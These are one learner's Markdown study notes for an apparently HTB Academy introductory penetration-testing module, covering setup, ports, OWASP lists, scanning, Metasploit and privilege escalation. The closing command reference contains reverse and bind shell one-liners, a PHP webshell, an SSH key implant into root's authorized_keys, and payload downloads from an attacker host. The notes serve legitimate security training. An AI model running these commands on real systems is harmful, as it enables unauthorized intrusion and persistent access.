# Getting Started

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
From zero to first box: set up an attack distro, learn the common tech and essential tools, run the basic pentest steps, root a first HTB box, and learn how to get help properly.

### Section notes

#### Infosec Overview
- Infosec = protecting data (electronic or physical, tangible or not) from unauthorized access, change, misuse and disruption, and reducing the impact when something does happen. Core goal: the **CIA triad** (confidentiality, integrity, availability).
- Specializations include network / infra security, appsec, security testing, auditing, business continuity, forensics, and incident detection & response.

**Risk management process (5 steps):**

| Step | What happens |
|---|---|
| Identify | Find the risks the business faces (legal, environmental, market, regulatory, ...) |
| Analyze | Impact and probability, mapped to policies and processes |
| Evaluate | Rank and prioritize, then decide: accept, avoid, control (mitigate) or transfer (insure) |
| Deal with | Eliminate or contain, working with the system's stakeholders |
| Monitor | Watch continuously; impact can change (low → high) |

- **Red team** = attackers (pentesting, social engineering). **Blue team** = defenders (risk analysis, policy, incident response, security tooling), which is most infosec jobs.
- **Pentester's job:** find risks in external and internal networks (vulns, data exposure, misconfigs, reputational risks), show how to reproduce them, and advise on mitigation or remediation. Assessments range from whitebox tests to phishing to scenario-based red teams.
- Rating vulns accurately means understanding the client's bigger risk picture.

**My takeaway:** severity isn't just technical. It depends on what the business risks and cares about.

#### Getting Started with a Pentest Distro
- I must be able to set up, maintain and secure both Linux and Windows attack machines. Depending on the job, I might test from a local VM, a cloud box, a VM inside the client network, or a client workstation (insider / assume-breach).
- No distro has every tool. Over time I'll build a list of must-haves, maybe even a custom VM from a Debian or Ubuntu base.
- **Fresh VM for every engagement**, so no client data leaks into another client's report and sensitive data isn't kept too long. That means I need a fast, repeatable setup (scripts, documented steps).
- Setup options: base OS (not recommended), dual boot (slow to switch), or **virtualization** (best). Hypervisors: VirtualBox, VMware Workstation (now free), Hyper-V, or bare-metal Proxmox / ESXi. VMs isolate my real network from vulnerable labs and client networks (VM breakouts do exist, though).
- A home lab is worth building: reproduce vulns, test remediations, practice new techniques safely.
- Pwnbox is Parrot-based. Local options are the **ISO** (install yourself, more customization) or the **OVA** (prebuilt appliance: OVF hardware settings + VMDK disk, quickest to deploy).
- Academy targets: Docker instances work without VPN. Some hosts (e.g. AD targets) need the VPN key when not using Pwnbox.

**My setup:** HTB Pwnbox (unlimited time).

**My takeaway:** a clean VM per client and a repeatable build process are professional basics, not extras.

#### Staying Organized
- Clear, accurate documentation from day one. A technical but disorganized tester struggles in this industry.
- **Folder structure per client, per assessment** (e.g. `EPT` = external, `IPT` = internal):

```text
Projects/<Client>/
├── EPT/
│   ├── evidence/{credentials,data,screenshots}
│   ├── logs/
│   ├── scans/
│   ├── scope/      ← IP / network lists to feed scanners
│   └── tools/
└── IPT/  (same layout)
```

  Some people use one folder per host instead. Pick what fits my workflow.
- **Note tools:** Cherrytree, VS Code, Evernote, Notion, GitBook, Sublime, Notepad++. On real engagements, keep client data **local only, never cloud-synced**. Learn Markdown (this repo is Markdown).
- **Knowledge base to maintain:** setup quick-references, per-phase command cheat sheets, every useful payload / command / tip from boxes and courses (HTB gives a cheat sheet per module), checklists, report templates per assessment type.
- **Findings database:** title, description, impact, remediation, references. Pre-written findings save huge time when reporting; just tailor them to the client.

**My takeaway:** this repo *is* my knowledge base. Next step is to add a findings database to it.

#### Connecting Using VPN
- **VPN** = encrypted tunnel over a public network into a private one, so my traffic appears to come from the VPN server.
- **Two remote-access types:**
  - **SSL VPN**: runs in the browser, no client install. Can be limited to web apps (mail, intranet) or give network access.
  - **Client-based VPN**: needs client software. Once connected, it's like being on the company network (full access or a remote-worker segment, depending on config).
- **Commercial VPNs** (NordVPN, PIA, ...) help bypass network restrictions or protect me on hostile Wi-Fi, but they **don't guarantee anonymity** (the provider might log everything), and they never protect anyone from the consequences of illegal activity.
- **HTB / lab VPNs are hostile networks:** connect only from a VM, no SSH password auth on my attack box, lock down any web servers, keep no sensitive data there, and **never use the same VM for labs and client work**.

**Commands (from the module, not run yet; Pwnbox is already on the lab network so I don't need these there):**

```bash
# [ATTACK BOX - own VM] connect; success = "Initialization Sequence Completed"
sudo openvpn user.ovpn

# [ATTACK BOX - own VM, second terminal] check for the tun0 adapter
ifconfig

# [ATTACK BOX - own VM] see which networks route through the VPN
netstat -rn
```

- In the module's example, the Academy target network `10.129.0.0/16` is reached through `tun0` via the `10.10.14.0/23` VPN network.

**My takeaway:** on Pwnbox, the VPN is handled for me. If I ever switch to my own VM, the `.ovpn` file is a credential and stays out of git (`.gitignore` already blocks `*.ovpn`).

#### Common Terms
**Shell:** the program that passes my input to the OS (bash on most Linux, plus sh, zsh, ksh, fish; cmd.exe / PowerShell on Windows). "Getting a shell" = interactive command access on a target, through a web/service vuln or valid creds.

| Shell type | How it works |
|---|---|
| Reverse | Target connects back to a listener on my attack box |
| Bind | Target listens on a port; I connect to it |
| Web | OS commands through the browser, usually not (or only semi-) interactive, e.g. an uploaded PHP script |

**Port:** a software endpoint tied to a service, managed by the OS, so different traffic types (SSH vs web) land in the right place. Services *can* run on non-standard ports.
- **TCP:** connection-oriented, handshake first, reliable.
- **UDP:** connectionless, no handshake, no delivery guarantee. Good for time-sensitive traffic where dropping beats waiting.
- 65,535 ports each for TCP and UDP.

Ports to know instantly (goal: recognize from the number alone):

| Port | Service |
|---|---|
| 20/21 TCP | FTP |
| 22 TCP | SSH |
| 23 TCP | Telnet |
| 25 TCP | SMTP |
| 80 TCP | HTTP |
| 88 | Kerberos |
| 161 UDP (also TCP) | SNMP |
| 389 TCP/UDP | LDAP |
| 443 TCP | HTTPS |
| 445 TCP | SMB |
| 3389 TCP | RDP |

**Web server:** the back-end app handling HTTP(S) on 80/443. It's internet-facing with a huge attack surface, so a web app vuln can lead to the whole server.

**OWASP Top 10:** the standard list of the most critical web app risk categories, and the usual starting point for web assessments (not exhaustive). The module teaches the **2021** list:

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, command injection, LDAP injection, ...)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures (e.g. untrusted plugins / CDNs)
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

**Update (not in the module): OWASP Top 10 2025**, released Nov 11, 2025:

1. Broken Access Control (now includes SSRF)
2. Security Misconfiguration
3. Software Supply Chain Failures (replaces Vulnerable and Outdated Components, wider scope)
4. Cryptographic Failures
5. Injection
6. Insecure Design
7. Authentication Failures
8. Software or Data Integrity Failures
9. Logging & Alerting Failures
10. Mishandling of Exceptional Conditions (new: race conditions, incomplete transactions, data leaked in error messages)

**My takeaway:** know both lists for interviews, and say which version you mean.

#### Basic Tools
Not pentest-specific, but used daily, so worth mastering. Reference below.

**SSH (22):** secure remote access via password or key. More stable than a reverse shell; good as a jump host for pivoting, file transfer, persistence.
```bash
ssh user@<TARGET>              # connect with creds
```

**Netcat / nc:** TCP/UDP swiss-army tool — connect to ports, grab banners, move files, handle shells.
```bash
nc -nv <TARGET> 22            # connect / banner grab (-n no DNS, -v verbose)
```
- `ncat` (nmap) and `socat` are richer alternatives. `socat` can port-forward, talk to serial devices, and upgrade a shell to a full TTY. PowerCat is a PowerShell netcat for Windows.

**tmux** — terminal multiplexer (multiple windows/panes in one terminal, good for logging during engagements). Prefix = `Ctrl+b`.
| Keys | Action |
|---|---|
| `Ctrl+b` then `c` | New window |
| `Ctrl+b` then `0`/`1`… | Switch to window N |
| `Ctrl+b` then `Shift+%` | Split vertical pane |
| `Ctrl+b` then `Shift+"` | Split horizontal pane |
| `Ctrl+b` then arrows | Move between panes |
```bash
sudo apt install tmux -y
```

**Vim** — keyboard-only editor; often the only one on a compromised Linux host. Modes: normal (navigate) → `i` insert → `Esc` back to normal → `:` command.
| Normal mode | Action |
|---|---|
| `x` / `dw` / `dd` | Cut char / word / line |
| `yw` / `yy` / `p` | Copy word / line / paste |
| (prefix a number) | Repeat, e.g. `4yw` copies 4 words |
| `:w` `:q` `:q!` `:wq` | Save / quit / quit-no-save / save+quit |
| `:1` | Go to line 1 |

**My takeaway:** an SSH session beats a shaky reverse shell when I have creds, and knowing Vim means I can edit files on any box I land on.

#### Service Scanning (command reference)
Goal of the section: identify the OS and running services, then look for misconfigured or outdated ones. Ports 1-1023 = well-known/privileged. Default Nmap scans top 1000 TCP ports only.

| Command | What it does |
|---|---|
| `nmap <target>` | Default: top 1000 TCP ports |
| `nmap -sV -sC -p- <target>` | Version detection + default scripts + all 65535 TCP ports |
| `nmap -A -p<port> <target>` | Aggressive: version, scripts, OS guess, traceroute |
| `nmap --script <name> -p<port> <target>` | Run a specific NSE script (scripts live in `/usr/share/nmap/scripts/`) |
| `nmap -sV --script=banner -p<port> <target>` | Banner grab via Nmap |

- `-sC` = default scripts, `-sV` = version/fingerprint, `-p-` = all ports, `-A` = aggressive. More flags/scripts slow the scan down a lot.
- STATE can be `open` / `closed` / `filtered` (filtered often = firewall).
- Version strings help guess the OS (e.g. an Ubuntu OpenSSH package version maps to a specific release), but it's not fully reliable since newer packages can run on older OSes.

**Per-service quick reference:**

| Service | Port | Tooling from this section |
|---|---|---|
| Banner grab | any | `nc -nv <target> <port>` |
| FTP | 21 | `ftp -p <target>` → `ls`, `cd`, `get <file>`; watch for anonymous login |
| SMB | 139/445 | `nmap --script smb-os-discovery.nse -p445 <target>`; `smbclient -N -L \\<target>` (list shares), `smbclient -U <user> \\<target>\<share>` |
| SNMP | 161/UDP | `snmpwalk -v 2c -c public <target>`; `onesixtyone -c dict.txt <target>` (brute community strings) |

- SMB can expose sensitive files in shares and older versions may be RCE-vulnerable (e.g. EternalBlue on legacy Windows). `-N` suppresses the password prompt.
- SNMP v1/v2c use a plaintext community string (`public`/`private` are common defaults); v3 added auth/encryption.

> Commands above are from the module. They move to `cheatsheets/` once I've actually run them in the lab.

**My takeaway:** default Nmap misses a lot (top 1000 only). Always confirm with a `-p-` pass, then `-sV -sC` on the open ports.

### Finding & using public exploits
Once I have a service + version, look for known exploits:
```bash
searchsploit openssh 7.2          # local Exploit-DB search
```
Metasploit basic workflow:
```bash
msfconsole
search eternalblue                # find a module
use exploit/windows/smb/ms17_010_psexec
show options                      # see required settings
set RHOSTS <target>
check                             # test if vulnerable (not all modules support it)
exploit
```

### Web enumeration (foundational)
```bash
gobuster dir -u http://<target>/ -w /usr/share/dirb/wordlists/common.txt   # dirs (deeper: module 15 ffuf)
gobuster dns -d <domain> -w /usr/share/SecLists/Discovery/DNS/namelist.txt # subdomains
whatweb <target>                  # server/CMS/cert fingerprint
curl -IL http://<target>          # headers / redirects
curl http://<target>/robots.txt   # disallowed paths often point at interesting dirs
```

### Shell handling — TTY upgrade
Getting a shell is covered in depth in **module 08 (Shells & Payloads)** (reverse/bind/webshell payloads live there). The one thing worth repeating everywhere is stabilising a raw shell into a usable TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # step 1: get a pty
# step 2: Ctrl+Z  ->  stty raw -echo; fg  ->  Enter twice   (now arrows/tab/Ctrl-C work)
```

### First privesc moves
Full coverage in **module 25 (Linux privesc)** / **26 (Windows privesc)**. The reflex first checks on Linux:
```bash
sudo -l            # what can I run as root/another user?
./linpeas.sh       # automated enum (transfer it over first — module 07)
```
If I can write a user's `~/.ssh/authorized_keys`, I can drop my own public key and SSH in as them — stable access without a shaky reverse shell.

## Full command reference (source notes)
Complete "Basic Tools" command set — nothing trimmed. (Reverse/bind shells + webshell are standard one-liners; the fuller treatment is in module 08.)

**General**
| Command | Description |
|---|---|
| `sudo openvpn user.ovpn` | Connect to the lab VPN |
| `ifconfig` / `ip a` | Show our IP address |
| `netstat -rn` | Show networks reachable via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |

**tmux**
| Key/Command | Description |
|---|---|
| `tmux` | Start tmux |
| `Ctrl+b` | Default prefix |
| `prefix c` | New window |
| `prefix 1` | Switch to window 1 |
| `prefix Shift+%` | Split pane vertically |
| `prefix Shift+"` | Split pane horizontally |
| `prefix →` | Switch to the right pane |

**Vim**
| Key | Description |
|---|---|
| `vim file` | Open file in vim |
| `Esc` + `i` | Enter insert mode |
| `Esc` | Back to normal mode |
| `x` / `dw` / `dd` | Cut character / word / full line |
| `yw` / `yy` | Copy word / full line |
| `p` | Paste |
| `:1` | Go to line 1 |
| `:w` / `:q` / `:q!` / `:wq` | Write / quit / quit no-save / write+quit |

**Service scanning**
| Command | Description |
|---|---|
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Script + version scan, all ports |
| `locate scripts/citrix` | List available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run a specific NSE script |
| `netcat 10.10.10.10 22` | Grab a service banner |
| `smbclient -N -L \\\\10.129.42.253` | List SMB shares (null session) |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute-force SNMP community string |

**Web enumeration**
| Command | Description |
|---|---|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Directory scan |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Sub-domain scan |
| `curl -IL https://www.inlanefreight.com` | Grab website banner/headers |
| `whatweb 10.10.10.121` | Webserver / cert details |
| `curl 10.10.10.121/robots.txt` | List potential dirs in robots.txt |
| `Ctrl+U` | View page source (Firefox) |

**Public exploits**
| Command | Description |
|---|---|
| `searchsploit openssh 7.2` | Search Exploit-DB for an app |
| `msfconsole` | Start Metasploit |
| `search exploit eternalblue` | Search exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | Load an MSF module |
| `show options` | Show required module options |
| `set RHOSTS 10.10.10.40` | Set a module option |
| `check` | Test if target is vulnerable |
| `exploit` | Run the exploit |

**Using shells** (standard one-liners — see module 08 for depth)
| Command | Description |
|---|---|
| `nc -lvnp 1234` | Start a netcat listener |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Reverse shell from the target |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Reverse shell (mkfifo) |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Bind shell on the target |
| `nc 10.10.10.1 1234` | Connect to a bind shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `Ctrl+z` → `stty raw -echo` → `fg` → Enter×2 | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a PHP webshell |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command via webshell |

**Privilege escalation**
| Command | Description |
|---|---|
| `./linpeas.sh` | Enumerate a Linux host for privesc |
| `sudo -l` | List sudo privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command as another user |
| `sudo su -` | Switch to root (if allowed) |
| `sudo su user -` | Switch to another user |
| `ssh-keygen -f key` | Create a new SSH keypair |
| `echo "ssh-rsa AAAAB...M= user@parrot" >> /root/.ssh/authorized_keys` | Add our pubkey to a user |
| `ssh root@10.10.10.10 -i key` | SSH in with the generated private key |

**Transferring files**
| Command | Description |
|---|---|
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file to the target |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file to the target |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file via scp |
| `base64 shell -w 0` | Encode a file to base64 |
| `echo f0VMR...InmDwU \| base64 -d > shell` | Decode base64 back to a file |
| `md5sum shell` | Verify the file transferred intact |
